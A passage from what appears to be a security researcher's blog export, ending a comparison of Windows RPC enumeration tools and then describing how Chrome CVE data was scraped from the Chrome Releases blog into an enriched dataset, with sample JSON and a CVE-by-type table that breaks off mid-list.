coffee before getting into this next section, or skip it entirely and check out the summary. Otherwise, brace yourself.The code path for RPC discovery via [NtApiDotNet.Win32.RpcServer]::ParsePeFile can be summarized as follows: LoadLibrary - The first thing is a call to LoadLibrary on the supplied binary path (such as C:\\Windows\\System32\\lsass.exe). This call is essentially a .NET wrapper (or interop) around the Win32 Native LoadLibraryEx that returns a SafeLoadLibraryHandle class type (which is a class that holds a reference to the loaded module with several useful helper methods). An interesting (and likely necessary for stability) flag passed to LoadLibraryEx here is DONT_RESOLVE_DLL_REFERENCES, which will prevent the DllMain from being called and further dependencies being loaded. Interestingly, MSDN tells us not to use it, but it seems like it would serve the purpose of just loading the binary to get a handle to the module for data parsing no? GetImageSections - After the SafeLoadLibraryHandle type is created, GetImageSections is called to parse each section of the loaded module. This is done via a call to the private method SetupValues responsible for building the list of ImageSections assigned the private SafeLoadLibraryHandle class member &lt;List&gt; _image_sections here. FindRpcServerInterfaces - Each image section (.text,.data,etc.) is then passed into FindRpcServerInterfaces. This call has a similar goal as the GetRpcServerAddressInProcess call in RpcView, that of searching for the root of RPC_SERVER_T data structure (pointed to at runtime by the GlobalRpcServer symbol). For FindRpcServerInterfaces the data structure is RPC_SERVER_INTERFACE and it discovers the data quite differently. Rather than looking for the GlobalRpcServer symbol within the rpcrt4.dll .data section at runtime, it discovers the data structure within the read-only data section (.rdata) memory section of the image it just loaded in step 1. It seems as though the base RPC data structure leading to interface, MIDL information, and all things RPC are available within the of the image on disk as well (AuthInfo excepted). FindRpcServerInterfaces searches through all loaded image memory sections for the DCE_TransferSyntax GUID. Once it is found, it returns a IEnumerable&lt;RpcOffset&gt; used in the next step. Some other key differences from RpcView are that FindRpcServerInterfaces: searches for an alternative NDR64_TransferSyntax GUID 71710533-BEBA-4937-8319-B5DBEF9CCC36. RpcView has code that will identify it in the InterfacesWidget::AddInterfaces enhancing the GUI, but will not find it when identifying RPC servers. I wonder if any interfaces come up with the NDR64 identifier?? I guess even if the NDR64 syntax ID was found, it can’t be fully parsed. doesn’t seem to be limited to the .data section, it looks at all sections (not sure if it matters though?). It’s only requirement is that the image section be readable. SymbolResolver.Create - At this point, a new instance of a SymboleResolver is created to leverage the pdb symbols for the RPC server (if available). I won’t explain any details of this besides it depends on dbghelp.dll being installed and configured to work properly. It is used later to resolve or “fixup” procedure names once they are identified. ReadFromRpcServerInterface - Read out RPC_SERVER_INTERFACE from the .rdata image section in memory. For each of the found RpcOffsets from FindRpcServerInterfaces a NdrParser is instantiated and leveraged to parse out all of the interfaces and procedures. The NdrParser class calls ReadFromRpcServerInterface which in turn calls its private method ReadRpcServerInterface that performs the rest of the work. On success, it returns a NdrRpcServerInterface that is used to finally generate an RpcServer class to add to the list of RPC servers found. ReadRpcServerInterface - Now we are in the thick of it. Within this method several things happen that for brevity (and hopefully not for lack of understanding) I will summarize. GetDispatchTable - This function reads the RPC_DISPATCH_TABLE struct referenced within RPC_SERVER_INTERFACE needed to get a count of the number of procedures for the interface (just like RpcView). ReadProcs - This method resolves all of the procedures relative to the identified interface and the RPC_DISPATCH_TABLE that contains the info needed to find the procedure offsets. It is within this function that all the procedures get their names from the aforementioned SymbolResolver. GetProtSeq Reads out all the endpoints pointers and transforms each one into a new NdrProtocolSequenceEndpoint class that assigns the protocol and endpoint. new NdrRpcServerInterface - This call takes all of the parsed information and wraps it into a nice data structure NdrRpcServerInterface private static NdrRpcServerInterface ReadRpcServerInterface(IMemoryReader reader, RPC_SERVER_INTERFACE server_interface, NdrTypeCache type_cache, ISymbolResolver symbol_resolver, NdrParserFlags parser_flags, IntPtr base_address){ RPC_DISPATCH_TABLE dispatch_table = server_interface.GetDispatchTable(reader); var procs = ReadProcs(reader, server_interface.GetServerInfo(reader), 0, dispatch_table.DispatchTableCount, type_cache, symbol_resolver, null, parser_flags, base_address); return new NdrRpcServerInterface(server_interface.InterfaceId, server_interface.TransferSyntax, procs, server_interface.GetProtSeq(reader).Select(s =&gt; new NdrProtocolSequenceEndpoint(s, reader)));}ThoughtsWell, one thought it that my head hurts. My venture into RPC enumeration tools has led me down paths of C++ and C# that I didn’t know I could travel. But as for NtObjectManager the tool and its RPC enumeration capability, I like it. It is trivial to discover all the RPC on a machine, both servers and RPC clients alike. One current downside is that it doesn’t seem to parse out any of the AuthInfo or registation flags as RpcView reports. On the other hand, it doesn’t miss an RPC servers or clients if they can be found on disk.RPCEnumRpcEnumThis tool is well described by @_xpn_. It is based on an RpcView runtime discovery and enumeration strategy.Code Source: https://github.com/xpn/RpcEnumThe RPC::huntForGlobalRPCServer function mimics RpcView’s search for GlobalRpcServer. The project it much easier to understand, more straight to the point and not littered with callbacks to QT like RpcView. In hind sight, I should have started here to better understand RpcView. Some nice features include the ability to dump JSON files related to interfaces and their procedures as pointed out in the corresponding article, the ability to graph all the things and find links between RPC calls and Win32 calls within RPC server binaries.RPCDumpRPCDumpThis is a dynamic tool by 0xcsandker that relies on an endpoint being registered by an RPC server via RpcEpRegister. During an RPC server initialization, the server would have had to call this function to make it known to the endpoint mapper.Code Source: https://github.com/csandker/RPCDumpThe code follows a path iterating through each endpoint in the RPC endpoint mapper. Another option is to query the Endpoint Manager directly by calling RpcMgmtEpEltInqBegin and iterating over the interfaces via RpcMgmtEpEltInqNext. 0xcsandkerOne cool thing about the tool is that is adds known endpoints to its analysis to enrich the information related to the outputs. . The known endpoints seem to be a collection known by the author from various sources.PS C:\\Users\\user\\source\\repos\\RPCDump\\x64\\Debug&gt; .\\CPP-RPCDump.exe localhost## Testing protseq.: ncacn_ip_tcpIfId: 51a227ae-825b-41f2-b4a9-1ac9557a1018 version 1.0Known Endpoint: (C:\\Windows\\System32\\keyiso.dll).Annotation: Ngc Pop Key ServiceUUID: 00000000-0000-0000-0000-000000000000Binding: ncacn_ip_tcp:localhost[49664]IfId: 367abb81-9844-35f1-ad32-98f038001003 version 2.0Known Endpoint: [MS-SCMR](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/19168537-40b5-4d7a-99e0-d77f0f5e0241).Annotation:UUID: 00000000-0000-0000-0000-000000000000Binding: ncacn_ip_tcp:localhost[49671]IfId: 650a7e26-eab8-5533-ce43-9c1dfce11511 version 1.0Known Endpoint: (C:\\Windows\\System32\\rascustom.dll).Annotation: Vpn APIsUUID: 00000000-0000-0000-0000-000000000000Binding: ncacn_np:localhost[\\\\PIPE\\\\ROUTER]IfId: 2f5f6521-cb55-1059-b446-00df0bce31db version 1.0Known Endpoint: (C:\\Windows\\System32\\unimdm.tsp.Annotation: Unimodem LRPC EndpointUUID: 00000000-0000-0000-0000-000000000000Binding: ncacn_np:localhost[\\\\pipe\\\\tapsrv]IfId: 12345678-1234-abcd-ef00-0123456789ab version 1.0Known Endpoint: [MS-RPRN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/e8f9dad8-d114-41cc-9a52-fc927e908cf4).Annotation:UUID: 00000000-0000-0000-0000-000000000000Binding: ncacn_ip_tcp:localhost[49669]Impacket - rpcdump.pyimpacket - rpcdump.pyNothing but good things to say about the impacket python library allowing fine grained control of packets for various network protocols. When learning how to use NtObjectManager exercising Petitpotam, I used @topotam77’s PetitPotam.py python implementation leveraging impacket as a control to make sure I understood the expected behavior for Petitpotam. This led to my blog post From NtObjectManager to PetitPotam.Code https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.pyThe script, rpcdump.py is another tool that relies on the endpoint mapper having a registered endpoint from an RPC server. It also has the benefit of combining known endpoints with the RPC enumeration results to provide more information.GhidraGhidraAh Ghidra, the most cost effective SRE tool on the market. It doesn’t have any native RPC discovery or enumeration functionality that I am aware of, but it is often used in combination with the aforementioned tools to provide insight into RPC through reverse engineering or used as a part of suite of tools used to map Windows RPC calls to native Win32 APIs. @_xpn_ also provided a Ghidra python script that would leverage the JSON output from RpcEnum to discover the RPC procedures in binaries and then recursively dump the functions called by each procedure.WinRpcFunctionsWinRpcFunctionsAnother article Extending the Exploration and Analysis of Windows RPC Methods Calling other Functions with Ghidra, Jupyter Notebooks and Graphframes by @Cyb3rWard0g built on xpn’s work.Code Source: https://github.com/Cyb3rWard0g/WinRpcFunctionsThe researcher put both RPC enumeration and xpn’s recursive function discovery into a single Ghidra script. The script could then map all RPC functions to Windows API calls within various RPC servers on disk. Using the script, RPC enumeration and discovery can be performed in Ghidra with it’s ability to analyze binaries and enriched with PDB symbols. Due to the fact that each binary needs to be analyzed in Ghidra for the script to function, it can take quite a bit of time. To narrow down analysis to only RPC servers, Cyb3rWard0g leverages NtObjectManager initially to identify and generate the list of RPC servers to avoid analyzing more binaries than necessary. For further details on this cool idea check out the blog post.SummaryIt turns out there are several available tools to discover RPC on a Windows machine. I know I have not exhausted the list, but perhaps I came close. Each tool and technique has their own advantages and disadvantages. Here is a best effort on a summary. Tool Type Pros Cons Requirements Language RpcView Dynamic GUI, AuthInfo Misses RPC clients and dormant servers RPC Server Running C++ NtObjectManager Static PS + Speed + Filtering + Clients No AuthInfo RPC Server Path Known PS,C# RpcEnum Dynamic JSON Output Misses RPC clients and dormant servers RPC Server Running C++ RpcDump Dynamic Well-Known Endpoints Blind to unregistered endpoints   C++ Impacket - rpcdump Dynamic Well-Known Endpoints     Python WinRpcFunctions Static Ghidra only Slow RPC Server Path Known Java When to use which tool?The answer to this question is “it depends”. RPC Purpose Tools Reason Trying to figure out client connection requirements RpcView Availability of AuthInfo Dynamically looking at running RPC servers RpcView Easy to navigate across interfaces and click around Looking for RPC clients NtObjectManager Ony tool that finds them? Trying to find all RPC servers on a machine NtObjectManager RPC server doesn’t have to be running Testing an RPC interface NtObjectManager Builds RPC clients on the fly Developing the next PetitPotam impacket low level control of RPC transport protocols That’s all for now. The next post will be an in depth walkthrough of using NtObjectManager to discover the well known PetotPotam.Please reach out @clearbluejar with questions or comments. Also appreciate any feedback or corrections you might have for the post.Cover photo by Todd Quackenbush on Unsplash" }, { "title": "Mining Google Chrome CVE data", "url": "/posts/mining-google-chrome-cve-data/", "categories": "projects, cve-markdown-charts", "tags": "chrome, graphs, chromium, python, monorail", "date": "2022-05-17 20:38:00 +0000", "snippet": " TL;DR - The Google Chrome Releases blog provides CVE data one liners containing all the information needed to create a rich CVE data source. Google Chrome CVEs are plentiful and provide information for understanding Google Chrome security trends. Using the information available, I was able to create an enriched CVE data source to enhance the CVE Markdown Charts Github project.CVE Data SourcesKnown CVE reliable data sources: Mitre NIST CVEs Github CVEProjectIn this short post I will walk you through the process I went through to build a new CVE data source from the Google Chrome Releases CVE data. The purpose of the data is to provide another enriched CVE data source for my latest CVE Markdown Charts side project.The current CVE 4.0 JSON schema provides the following info: CVE_JSON_4.0_min_public.schema The v4.0 CVE info is decent, but still lacking. Microsoft provides a rich data set each month containing in depth information for all their CVEs on Patch Tuesday. The information is available through MSRC’s public API (for more details see how I originally leveraged that data in my first CVE Markdown Charts post.Some of the fields of interest in the MSRC CVRF security updates are: Type (RCE,LPE, Info Disclosure, etc.) Acknowledgement (researcher who found it) Component Tag (details on the specific affected component)With this information we can start to build some interesting charts. How can I find this info for Google Chrome CVEs? Is it readily available?CVE JSON Schema++?The v4.0 CVE json is about to change to 5.0, but I will believe it when I see it. The proposed schema is a bit larger than the previous one. You can see the new CVE 5.0 schema here. They added fields that seem to match the enriched ones above and several more.For example, they seem to have a new credit field in the schema to match acknowledgement: \"credits\": [ { \"lang\": \"en\", \"value\": \"Alice\", \"type\": \"finder\" }, { \"lang\": \"en\", \"value\": \"Bob\", \"type\": \"analyst\" }, { \"lang\": \"en\", \"value\": \"Acme Autofuzz\", \"type\": \"tool\" } ],They also have some fields that might provide both the type and component. I doubt they will retroactively populate all the old CVEs with new information even once the schema migrates to 5.Well if this data isn’t here yet, what can we do today for Google Chrome CVEs?Monorail Chromium Bug Tracker Monorail is the Issue Tracker used by the Chromium project and other related projects. It is hosted at bugs.chromium.org. SourceA quick google search didn’t provide any leads to Google Chrome CVE data. It did lead me to their standard Monorail bug tracker list. I say standard because they seem to host all their open source project issues in Monorail.The bug tracker lists CVE information if you adjust filter and columns:Chromium Bug TrackerPerfect. This list seems to have the type, component, and even the acknowledgement data I’m looking for. The acknowledgment data is masked a bit (see in picture halfname..partofit@provider.com), but maybe that is OK? Now, how do I leverage an API to grab the data? This is Google, surely they have an one.Monorail APII found a link to the Monorail API and their test python client. The script and site seemed a bit dated but simple enough.Hmm. They want to authenticate? That usually is a bridge too far for me. But maybe we don’t need to authenticate? I pulled down the python script and set it up. I ran the client script and tried commenting out the credentials section…Monorail API client needs authenticationNo joy. I really don’t want to have to authenticate to query the API. Too much overhead and I’m simply running a query once a month. What other options do I have?Google Chrome Releases BlogIt seems that all (most?) of Google Chrome CVEs are also available on their Google Chrome Releases blog.Google Release BlogEach month, similar to Microsoft’s monthly secutiy updates, they publish release notifications on this blog and list the CVEs under the section “Security Fixes and Rewards”.Google Chrome Releases Blog CVE one-linersHmm. The data is here. In the security section there is a list of the CVEs fixed during the current month:May 2022 Google Chrome CVE One-liners [$5000][1316990] High CVE-2022-1633: Use after free in Sharesheet. Reported by Khalil Zhani on 2022-04-18 [$3000][1314908] High CVE-2022-1634: Use after free in Browser UI. Reported by Khalil Zhani on 2022-04-09 [$3000][1319797] High CVE-2022-1635: Use after free in Permission Prompts. Reported by Anonymous on 2022-04-26 [$NA][1297283] High CVE-2022-1636: Use after free in Performance APIs. Reported by Seth Brenith, Microsoft  on 2022-02-15 [$TBD][1311820] High CVE-2022-1637: Inappropriate implementation in Web Contents. Reported by Alesandro Ortiz on 2022-03-31 [$TBD][1316946] High CVE-2022-1638: Heap buffer overflow in V8 Internationalization. Reported by DoHyun Lee (@l33d0hyun) of DNSLab, Korea University on 2022-04-17 [$TBD][1317650] High CVE-2022-1639: Use after free in ANGLE. Reported by SeongHwan Park (SeHwa) on 2022-04-19 [$TBD][1320592] High CVE-2022-1640: Use after free in Sharing. Reported by Weipeng Jiang (@Krace) and Guang Gong of 360 Vulnerability Research Institute on 2022-04-28 [$5000][1305068] Medium CVE-2022-1641: Use after free in Web UI Diagnostics. Reported by Rong Jian of VRI on 2022-03-10These beautiful CVE one-liners contain all the data I’m looking for. [$5000][1316990] High CVE-2022-1633: Use after free in Sharesheet. Reported by Khalil Zhani on 2022-04-18 field data reward $5000 url 1316990 severity High cve_id CVE-2022-1633 type Use after free component Sharesheet acknowledgment Khalil Zhani Building Google Chrome Enriched CVE dataRight. Time to do some scraping. Don’t hate me Google.Scraping like it’s 1999We are actually scraping like it’s 2008, because that is how far back this blog goes. I built a scraper that would build a set of URLs that matched the simple pattern. The urls span from 2008 until present day.I tried a couple different ways to pull out and parse the CVE data. I started to try to handle all the cases using various html tags as hook points # finding parent &lt;ul&gt; tag for li in soup.find(\"body\").findAll(\"li\"): if \"CVE\" in str(li): #print(len(li)) cves.append(li.text) # &lt;p&gt; works for 2022 for p in soup.find(\"body\").findAll(\"p\"): if \"CVE\" in str(p): #print(len(p)) cves.append(p.text) # find all &lt;divs&gt; all_divs = iter(soup.find(\"body\").findAll(\"div\")) for div in all_divs: dir = div.attrs.get('dir') if \"CVE\" in str(div) and dir == 'ltr':But the complexity was a bit much and focusing on different tags tended to either duplicate or miss data.Then I found the most simple heuristic is to leverage beautifulsoup’s ability to find all the href tags in the response. From the CVE urls, both legacy (http://code.google.com/p/chromium/issues/detail?id=72517) and recent (https://crbug.com/1305068) URLs, I was able to discover ~2000 CVEs starting from about 2011. This lined up with the number of issues (+/- 25 CVEs) I could see in the Monorail site.chromerelease.py console outputResultsFrom the scraping I was able to produce the final enriched Google Chrome CVE data in two steps.The first step did the scraping and recorded the one-liners in chromerelease_raw_cve.json: [ \"2011-01\", \"http://code.google.com/p/chromium-os/issues/detail?id=10234\", \"Kernel is vulnerable to CVE-2010-4258 (10234)\" ], [ \"2011-03\", \"http://code.google.com/p/chromium/issues/detail?id=72517\", \"[$500] [72517] High CVE-2011-1291: Buffer error in base string handling. Credit to Alex Turpin.\" ], [ \"2011-03\", \"http://code.google.com/p/chromium/issues/detail?id=73216\", \"[$1000] [73216] High CVE-2011-1292: Use-after-free in the frame loader. Credit to S\\u0142awomir B\\u0142a\\u017cek.\" ], [ \"2011-03\", \"http://code.google.com/p/chromium/issues/detail?id=73595\", \"[$2000] [73595] High CVE-2011-1293: Use-after-free in HTMLCollection. Credit to Sergey Glazunov.\" ],The second step parsed the one-liners to create the final enriched chromerelease_cve.json: { \"blog_id\": \"2011-01\", \"url\": \"http://code.google.com/p/chromium-os/issues/detail?id=10234\", \"reward\": null, \"bug_id\": null, \"severity\": null, \"cve_id\": \"CVE-2010-4258\", \"description\": null, \"date\": \"2011-01-01\", \"acknowledgment\": null, \"type\": null, \"component\": null }, { \"blog_id\": \"2011-03\", \"url\": \"http://code.google.com/p/chromium/issues/detail?id=72517\", \"reward\": \"500\", \"bug_id\": \"72517\", \"severity\": \"High\", \"cve_id\": \"CVE-2011-1291\", \"description\": \"Buffer error in base string handling\", \"date\": \"2011-03-01\", \"acknowledgment\": \"Alex Turpin\", \"type\": \"buffer error\", \"component\": \"base string handling\" }, { \"blog_id\": \"2011-03\", \"url\": \"http://code.google.com/p/chromium/issues/detail?id=73216\", \"reward\": \"1000\", \"bug_id\": \"73216\", \"severity\": \"High\", \"cve_id\": \"CVE-2011-1292\", \"description\": \"Use-after-free in the frame loader\", \"date\": \"2011-03-01\", \"acknowledgment\": \"S\\u0142awomir B\\u0142a\\u017cek\", \"type\": \"use after free\", \"component\": \"the frame loader\" }Enhancing CVE Markdown ChartsWith this new data set we can start to build some useful charts in CVE Markdown Charts with build_markdown_goat_charts_from_chrome_data :All Time CVEs by TypeWhat type of vulnerabilities is Google Chrome most susceptible to?pie title All Time Chrome CVE Data by Type \"use after free\" : 540 \"insufficient policy enforcement\" : 114 \"out of bounds read\" : 92 \"heap buffer overflow\" : 92 \"inappropriate implementation\" : 91 \"type confusion\" : 55 \"out of bounds write\" : 41 \"integer overflow\" : 39 \"incorrect security ui\" : 34 \"insufficient data validation\" : 31 \"url spoof\" : 30 \"memory corruption\" : 24 \"cross origin bypass\" : 22 \"heap overflow\" : 20 \"out of bounds memory access\" : 18 \"bad cast\" : 16 CVE Type CVEs Count use after free CVE-2011-1292CVE-2011-1293CVE-2011-1440CVE-2011-1449CVE-2011-1454CVE-2011-1301CVE-2011-2346CVE-2011-2351CVE-2011-2349CVE-2011-1809CVE-2011-1816CVE-2011-1818CVE-2011-2823CVE-2011-2824CVE-2011-2825CVE-2011-2827CVE-2011-2846CVE-2011-2847CVE-2011-2853CVE-2011-2854CVE-2011-2854CVE-2011-2857CVE-2011-2860CVE-2011-3882CVE-2011-3883CVE-2011-3888CVE-2011-3890CVE-2011-3897CVE-2011-3912CVE-2011-3913CVE-2011-3924CVE-2011-3925CVE-2011-3928CVE-2011-3921CVE-2011-3021CVE-2011-3023CVE-2011-3957CVE-2011-3966CVE-2011-3968CVE-2011-3969CVE-2011-3971CVE-2011-3064CVE-2011-3050CVE-2011-3051CVE-2011-3053CVE-2011-3078CVE-2012-1521CVE-2011-3081CVE-2011-3105CVE-2011-3108CVE-2011-3112CVE-2011-3086CVE-2011-3089CVE-2011-3091CVE-2011-3096CVE-2012-2817CVE-2012-2818CVE-2012-2823CVE-2012-2824CVE-2012-2827CVE-2012-2829CVE-2012-2831CVE-2012-2855CVE-2012-2857CVE-2012-2842CVE-2012-2843CVE-2012-2887CVE-2012-2888CVE-2012-2878CVE-2012-2890CVE-2012-2890CVE-2012-2890CVE-2012-5137CVE-2012-5133CVE-2012-5135CVE-2012-5116CVE-2012-5121CVE-2012-5125CVE-2012-5126CVE-2012-5139CVE-2012-5140CVE-2013-0839CVE-2012-5145CVE-2012-5147CVE-2012-5150CVE-2012-5156CVE-2013-0832CVE-2013-0880CVE-2013-0898CVE-2013-0916CVE-2013-0920CVE-2013-0902CVE-2013-0903CVE-2013-0905CVE-2013-2833CVE-2013-2837CVE-2013-2840CVE-2013-2841CVE-2013-2842CVE-2013-2843CVE-2013-2844CVE-2013-2846CVE-2013-2856CVE-2013-2857CVE-2013-2858CVE-2013-2860CVE-2013-2861CVE-2013-2883CVE-2013-2884CVE-2013-2885CVE-2013-2885CVE-2013-2870CVE-2013-2870CVE-2013-2871CVE-2013-2871CVE-2013-2873CVE-2013-2902CVE-2013-2903CVE-2013-2904CVE-2013-2925CVE-2013-2926CVE-2013-2927CVE-2013-2909CVE-2013-2909CVE-2013-2910CVE-2013-2911CVE-2013-2912CVE-2013-2913CVE-2013-2914CVE-2013-2918CVE-2013-2921CVE-2013-2922CVE-2013-2924CVE-2013-6621CVE-2013-6622CVE-2013-6624CVE-2013-6625CVE-2013-6631CVE-2013-6635CVE-2014-1713CVE-2014-1713CVE-2014-1732CVE-2014-1743CVE-2014-1743CVE-2014-1745CVE-2014-1745CVE-2014-3154CVE-2014-3154CVE-2015-1209CVE-2015-1209CVE-2015-1209CVE-2015-1216CVE-2015-1218CVE-2015-1220CVE-2015-1221CVE-2015-1222CVE-2015-1223CVE-2015-1276CVE-2015-1282CVE-2015-1284CVE-2015-1272CVE-2015-1277CVE-2015-1294CVE-2015-1295CVE-2015-1299CVE-2015-6756CVE-2015-6757CVE-2015-6789CVE-2015-6765CVE-2015-6766CVE-2015-6767CVE-2015-6774CVE-2015-6777CVE-2015-6780CVE-2016-1613CVE-2016-1647CVE-2016-1648CVE-2016-1644CVE-2016-1633CVE-2016-1634CVE-2016-1635CVE-2016-1639CVE-2016-1641CVE-2016-1662CVE-2016-1663CVE-2016-1655CVE-2016-1700CVE-2016-1701CVE-2016-5150CVE-2016-5151CVE-2016-5156CVE-2016-5177CVE-2016-5170CVE-2016-5171CVE-2016-5183CVE-2016-5184CVE-2016-5185CVE-2016-5190CVE-2016-5203CVE-2016-5211CVE-2016-5213CVE-2016-5216CVE-2016-5215CVE-2016-5219CVE-2017-5019CVE-2017-5021CVE-2017-5056CVE-2017-5055CVE-2017-5056CVE-2017-5062CVE-2017-5064CVE-2017-5073CVE-2017-5074CVE-2017-5080CVE-2017-5091CVE-2017-5092CVE-2017-5098CVE-2017-5100CVE-2017-5111CVE-2017-5126CVE-2017-5127CVE-2017-5129CVE-2017-15399CVE-2017-15410CVE-2017-15411CVE-2017-15412CVE-2018-6031CVE-2018-6054CVE-2017-11215CVE-2017-11225CVE-2018-6060CVE-2018-6118CVE-2018-6085CVE-2018-6086CVE-2018-6087CVE-2018-6088CVE-2018-6123CVE-2018-6127CVE-2018-6155CVE-2018-6158CVE-2018-6171CVE-2018-16071CVE-2018-17465CVE-2018-17474CVE-2018-17481CVE-2018-18336CVE-2018-18337CVE-2018-18339CVE-2018-18340CVE-2018-18343CVE-2018-18356CVE-2018-20066CVE-2019-5756CVE-2019-5758CVE-2019-5759CVE-2019-5760CVE-2019-5761CVE-2019-5762CVE-2019-5764CVE-2019-5772CVE-2019-5787CVE-2019-5788CVE-2019-5789CVE-2019-5786CVE-2019-5805CVE-2019-5808CVE-2019-5809CVE-2019-5842CVE-2019-5828CVE-2019-5829CVE-2019-5850CVE-2019-5860CVE-2019-5869CVE-2019-5868CVE-2019-13685CVE-2019-13688CVE-2019-13687CVE-2019-13686CVE-2019-5870CVE-2019-13766CVE-2019-13766CVE-2019-5872CVE-2019-5876CVE-2019-5878CVE-2019-13721CVE-2019-13720CVE-2019-13699CVE-2019-13765CVE-2019-13723CVE-2019-13767CVE-2019-13725CVE-2019-13729CVE-2019-13732CVE-2020-6378CVE-2020-6379CVE-2020-6377CVE-2020-6384CVE-2020-6386CVE-2020-6450CVE-2020-6451CVE-2020-6422CVE-2020-6424CVE-2020-6427CVE-2020-6428CVE-2020-6429CVE-2020-6449CVE-2020-6462CVE-2020-6461CVE-2020-6459CVE-2020-6463CVE-2020-6457CVE-2020-6454CVE-2020-6423CVE-2020-6572CVE-2020-6434CVE-2020-6436CVE-2020-6448CVE-2020-6465CVE-2020-6466CVE-2020-6467CVE-2020-6474CVE-2020-6509CVE-2020-6505CVE-2020-6493CVE-2020-6496CVE-2020-6508CVE-2020-6532CVE-2020-6539CVE-2020-6541CVE-2020-6515CVE-2020-6518CVE-2020-6559CVE-2020-6542CVE-2020-6543CVE-2020-6544CVE-2020-6545CVE-2020-6549CVE-2020-6550CVE-2020-6551CVE-2020-6552CVE-2020-6553CVE-2020-6554CVE-2020-6573CVE-2020-6576CVE-2020-16001CVE-2020-16002CVE-2020-16003CVE-2020-15993CVE-2020-13871CVE-2020-15994CVE-2020-15996CVE-2020-15997CVE-2020-15998CVE-2020-15967CVE-2020-15968CVE-2020-15969CVE-2020-15970CVE-2020-15971CVE-2020-15972CVE-2020-15990CVE-2020-15991CVE-2020-15976CVE-2020-15987CVE-2020-16018CVE-2020-16014CVE-2020-16023CVE-2020-16045CVE-2020-16026CVE-2020-16017CVE-2020-16037CVE-2020-16038CVE-2020-16039CVE-2021-21119CVE-2021-21120CVE-2021-21121CVE-2021-21122CVE-2020-16044CVE-2021-21138CVE-2021-21150CVE-2021-21151CVE-2021-21157CVE-2021-21142CVE-2021-21145CVE-2021-21146CVE-2021-21194CVE-2021-21195CVE-2021-21191CVE-2021-21193CVE-2021-21162CVE-2021-21167CVE-2021-21179CVE-2021-21180CVE-2021-21188CVE-2021-21232CVE-2021-21232CVE-2021-21226CVE-2021-21201CVE-2021-21202CVE-2021-21203CVE-2021-21204CVE-2021-21207CVE-2021-21213CVE-2021-21214CVE-2021-30522CVE-2021-30523CVE-2021-30524CVE-2021-30525CVE-2021-30527CVE-2021-30528CVE-2021-30529CVE-2021-30542CVE-2021-30543CVE-2021-30512CVE-2021-30514CVE-2021-30515CVE-2021-30519CVE-2021-30520CVE-2021-30554CVE-2021-30555CVE-2021-30556CVE-2021-30557CVE-2021-30544CVE-2021-30545CVE-2021-30546CVE-2021-30548CVE-2021-30549CVE-2021-30550CVE-2021-30552CVE-2021-30553CVE-2021-30567CVE-2021-30569CVE-2021-30572CVE-2021-30573CVE-2021-30574CVE-2021-30576CVE-2021-30579CVE-2021-30581CVE-2021-30585CVE-2021-30541CVE-2021-30560CVE-2021-30562CVE-2021-30606CVE-2021-30607CVE-2021-30608CVE-2021-30609CVE-2021-30610CVE-2021-30611CVE-2021-30612CVE-2021-30613CVE-2021-30616CVE-2021-30622CVE-2021-30623CVE-2021-30624CVE-2021-30600CVE-2021-30601CVE-2021-30602CVE-2021-30604CVE-2021-37956CVE-2021-38008CVE-2021-38006CVE-2021-38005CVE-2021-38011CVE-2021-4099CVE-2021-4102CVE-2021-4052CVE-2021-4053CVE-2021-4057CVE-2021-4063CVE-2021-4064CVE-2021-4065CVE-2021-4067CVE-2022-0289CVE-2022-0290CVE-2022-0290CVE-2022-0293CVE-2022-0295CVE-2022-0296CVE-2022-0297CVE-2022-0298CVE-2022-0300CVE-2022-0302CVE-2022-0307CVE-2022-0308CVE-2022-0603CVE-2022-0605CVE-2022-0606CVE-2022-0607CVE-2022-0609CVE-2022-0452CVE-2022-0453CVE-2022-0456CVE-2022-0458CVE-2022-0459CVE-2022-0460CVE-2022-0463CVE-2022-0464CVE-2022-0465CVE-2022-0468CVE-2022-0469CVE-2022-1125CVE-2022-1127CVE-2022-1131CVE-2022-1133CVE-2022-1135CVE-2022-1136CVE-2022-1141CVE-2022-1144CVE-2022-1145CVE-2022-0971CVE-2022-0972CVE-2022-0973CVE-2022-0975CVE-2022-0977CVE-2022-0978CVE-2022-0979CVE-2022-0980CVE-2022-1477CVE-2022-1478CVE-2022-1479CVE-2022-1481CVE-2022-1485CVE-2022-1487CVE-2022-1490CVE-2022-1491CVE-2022-1493CVE-2022-1496CVE-2022-1633CVE-2022-1634CVE-2022-1635CVE-2022-1636CVE-2022-1639CVE-2022-1640CVE-2022-1641CVE-2022-1633CVE-2022-1634CVE-2022-1635CVE-2022-1636CVE-2022-1639CVE-2022-1640CVE-2022-1641 540 insufficient policy enforcement CVE-2018-18349CVE-2018-18350CVE-2018-18351CVE-2018-18355CVE-2018-18357CVE-2018-18358CVE-2018-20069CVE-2018-20070CVE-2018-20071CVE-2019-5765CVE-2019-5766CVE-2019-5768CVE-2019-5775CVE-2019-5776CVE-2019-5777CVE-2019-5778CVE-2019-5779CVE-2019-5781CVE-2020-6504CVE-2019-5880CVE-2019-13727CVE-2019-13737CVE-2019-13738CVE-2019-13744CVE-2019-13745CVE-2019-13746CVE-2019-13748CVE-2019-13754CVE-2019-13755CVE-2019-13758CVE-2019-13762CVE-2019-13763CVE-2020-6425CVE-2020-6420CVE-2020-6431CVE-2020-6432CVE-2020-6433CVE-2020-6435CVE-2020-6438CVE-2020-6439CVE-2020-6441CVE-2020-6445CVE-2020-6446CVE-2020-6469CVE-2020-6471CVE-2020-6472CVE-2020-6473CVE-2020-6476CVE-2020-6480CVE-2020-6481CVE-2020-6482CVE-2020-6483CVE-2020-6486CVE-2020-6487CVE-2020-6488CVE-2020-6506CVE-2020-6495CVE-2020-6497CVE-2020-6527CVE-2020-6558CVE-2020-6560CVE-2020-6562CVE-2020-6563CVE-2020-6566CVE-2020-6568CVE-2020-15961CVE-2020-15962CVE-2020-15963CVE-2020-15966CVE-2020-6574CVE-2020-15959CVE-2020-15973CVE-2020-15980CVE-2020-15984CVE-2020-15992CVE-2020-15988CVE-2020-16022CVE-2020-16027CVE-2021-21117CVE-2021-21125CVE-2021-21126CVE-2021-21127CVE-2021-21129CVE-2021-21130CVE-2021-21131CVE-2021-21133CVE-2021-21136CVE-2021-21141CVE-2021-21168CVE-2021-21172CVE-2021-21177CVE-2021-21182CVE-2021-21185CVE-2021-21186CVE-2021-21189CVE-2021-21228CVE-2021-21205CVE-2021-30531CVE-2021-30532CVE-2021-30533CVE-2021-30534CVE-2021-30558CVE-2021-30537CVE-2021-30538CVE-2021-30539CVE-2021-30571CVE-2021